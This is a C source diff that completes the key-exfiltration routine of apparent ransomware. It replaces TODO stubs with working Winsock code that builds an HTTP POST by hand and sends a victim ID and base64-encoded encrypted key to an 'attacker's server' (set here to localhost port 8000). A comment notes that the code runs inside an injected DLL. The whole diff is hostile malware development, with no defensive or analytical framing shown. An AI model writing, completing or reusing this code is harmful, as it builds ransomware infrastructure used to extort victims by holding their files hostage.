@@ -4,6 +4,8 @@
 #include <string.h>
 #include <stdbool.h>
 #include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
 
 #include "mbedtls/base64.h"
 
@@ -146,17 +148,82 @@ static int send_to_server(const char *victim_id, const char *encrypted_key) {
     snprintf(json, json_size,
              "{\"victim_id\":\"%s\", \"encrypted_key\":\"%s\"}",
              victim_id, encrypted_key);
+
+    /* Sending the API request using raw sockets as external libraries were harder
+     * to statically link and WinHTTP failed in the injected dll context (error 5023). */
+
+    // initialize windows sockets
+    WSADATA wsa;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        free(json);
+        return -1;
+    }
     
-    // TODO: send json to attacker's server with api request
+    // create tcp socket
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        WSACleanup();
+        free(json);
+        return -1;
+    }
+    
+    // setup server address
+    struct sockaddr_in server;
+    server.sin_family = AF_INET;
+    server.sin_port = htons(8000);
+    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // localhost
+    
+    // connect to server
+    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
+        closesocket(sock);
+        WSACleanup();
+        free(json);
+        return -1;
+    }
+    
+    // build HTTP POST request manually
+    size_t request_size = strlen("POST /api/keys HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nContent-Type: application/json\r\nContent-Length: ") +
+                          strlen(json) + 20 + strlen("\r\n\r\n") + 1;
+    char *request = malloc(request_size);
+    if (!request) {
+        closesocket(sock);
+        WSACleanup();
+        free(json);
+        return -1;
+    }
+    
+    snprintf(request, request_size,
+             "POST /api/keys HTTP/1.1\r\n"
+             "Host: 127.0.0.1:8000\r\n"
+             "Content-Type: application/json\r\n"
+             "Content-Length: %zu\r\n"
+             "\r\n"
+             "%s",
+             strlen(json), json);
+    
+    // send HTTP request
+    int sent = send(sock, request, strlen(request), 0);
+    
+    // read response
+    char buffer[1024];
+    recv(sock, buffer, sizeof(buffer), 0);
     
     // cleanup
+    closesocket(sock);
+    WSACleanup();
+    free(request);
     free(json);
     
-    return 0;  // TODO: return actual result from api request
+    // check if send was successful
+    if (sent > 0) {
+        return 0;  // success
+    } else {
+        return -1; // failure
+    }
 }
 
 /* Send encrypted key to attacker's server */
-static int send_key_to_attacker(const char *key_file) {
+int send_key_to_attacker(const char *key_file) {
 
     // generate victim ID
     char victim_id[64];
@@ -179,11 +246,12 @@ static int send_key_to_attacker(const char *key_file) {
         return -1;
     }
 
-    // TODO send key to attacker's server through api request
+    // send to attacker's server
+    int result = send_to_server(victim_id, base64_key);
 
     // cleanup
     free(key_data);
     free(base64_key);
 
-    return 0; // TODO change to return result of sending key to attacker's server when implemented
+    return result;
 }
